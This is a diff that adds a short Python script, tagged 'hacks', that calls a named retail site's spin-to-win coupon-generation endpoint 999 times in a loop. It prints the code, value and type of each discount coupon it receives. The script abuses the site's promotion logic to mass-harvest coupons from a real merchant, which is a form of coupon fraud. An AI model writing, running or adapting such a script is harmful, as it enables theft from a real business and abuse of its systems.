@@ -1,0 +1,15 @@
+---
+tags: [python, hacks, sleepycat]
+language: python
+---
+
+import requests
+import time
+
+for i in range(1, 1000):
+    x = requests.get('https://mysleepyhead.com/index.php?route=extension/module/spin_win/generate_coupon')
+    data = x.json()
+    print(f'{data["code"]},{data["value"]},{data["type"]},{data["coupon_type"]}')
+
+    time.sleep(3)
+
